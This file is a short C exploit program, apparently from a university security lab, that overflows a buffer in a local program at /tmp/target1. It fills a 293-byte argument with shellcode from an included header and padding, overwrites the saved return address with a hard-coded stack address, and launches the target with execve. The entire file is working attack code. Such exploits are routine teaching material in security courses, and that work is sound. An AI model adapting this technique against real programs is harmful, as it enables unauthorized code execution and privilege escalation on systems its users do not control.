#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
	char arg1[293];
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };

	strcpy(arg1,shellcode);
	memset(arg1+strlen(shellcode),0x55,293-strlen(shellcode));
	*(unsigned *)(&arg1[288])=0xbefffb84;
	arg1[292]=0;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
